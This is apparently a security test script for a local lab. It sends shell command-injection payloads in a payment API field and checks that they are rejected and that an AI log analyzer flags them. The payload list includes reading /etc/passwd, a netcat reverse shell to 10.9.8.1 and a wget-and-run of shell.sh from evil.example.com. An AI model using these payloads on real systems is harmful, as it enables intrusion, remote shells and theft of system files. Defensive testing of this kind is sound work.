#!/bin/bash
# Scenario 14 — Command Injection in API Parameters (T1059)
# Sends shell metacharacter payloads in payment request fields.
# Expects input validation to reject them (400/422) and AI to detect the pattern.
set -euo pipefail

GW_URL="${GW_URL:-http://localhost:18080}"
KC_URL="${KC_URL:-http://localhost:18443}"
AI_URL="${AI_URL:-http://localhost:18082}"
SCENARIO="scenario_14_command_injection"

log()  { printf "[%s] %s\n" "$SCENARIO" "$*"; }
pass() { printf "[%s] PASS: %s\n" "$SCENARIO" "$*"; }
fail() { printf "[%s] FAIL: %s\n" "$SCENARIO" "$*" >&2; exit 1; }

curl -fsS "$GW_URL/health" >/dev/null || fail "API Gateway unreachable"
curl -fsS "$AI_URL/health" >/dev/null || fail "AI Analyzer unreachable"

TOKEN=$(curl -s -X POST "$KC_URL/realms/ztlab/protocol/openid-connect/token" \
  -d "grant_type=password&client_id=web-portal&username=testuser01&password=Test1234!" \
  | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null || echo "")

log "sending command injection payloads..."
PAYLOADS=(
  '$(cat /etc/passwd)'
  '; ls -la /; #'
  '| nc -e /bin/sh 10.9.8.1 4444'
  '`wget http://evil.example.com/shell.sh -O /tmp/s && bash /tmp/s`'
)
blocked=0
for payload in "${PAYLOADS[@]}"; do
  AUTH_HEADER=()
  [[ -n "$TOKEN" ]] && AUTH_HEADER=(-H "Authorization: Bearer $TOKEN")
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "$GW_URL/payments" \
    "${AUTH_HEADER[@]}" \
    -H "Content-Type: application/json" \
    -d "{\"from_account\":\"$(printf '%s' "$payload" | python3 -c 'import sys,json; print(json.dumps(sys.stdin.read()))'|tr -d '"')\",\"to_account\":\"ACC-2001\",\"amount\":1000,\"currency\":\"VND\"}")
  log "payload → HTTP $code"
  [[ "$code" =~ ^(400|403|422|500)$ ]] && blocked=$((blocked + 1))
done
log "$blocked/${#PAYLOADS[@]} command injection payloads rejected"

log "injecting command injection detection log to AI Analyzer..."
ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
response=$(curl -fsS -X POST "$AI_URL/analyze" \
  -H "Content-Type: application/json" \
  -d '{
    "source": "scenario_14_command_injection",
    "logs": [
      {"timestamp": "'"$ts"'",
       "message": "exploit_probe command_injection attempt detected from_account=\"$(cat /etc/passwd)\" source_ip=198.51.100.99 path=/payments method=POST",
       "labels": {"namespace":"financial","app":"api-gateway","job":"kubernetes-pods"}},
      {"timestamp": "'"$ts"'",
       "message": "input_sanitization blocked shell metacharacters field=from_account pattern=command_injection source_ip=198.51.100.99",
       "labels": {"namespace":"financial","app":"payment-service","job":"kubernetes-pods"}}
    ]
  }')
verdict=$(printf '%s' "$response" | python3 -c "import json,sys; print(json.load(sys.stdin).get('verdict','?'))")
[[ "$verdict" == "malicious" || "$verdict" == "suspicious" ]] \
  || fail "expected malicious/suspicious, got $verdict"

pass "$blocked/${#PAYLOADS[@]} command injections rejected; AI verdict=$verdict (T1059)"
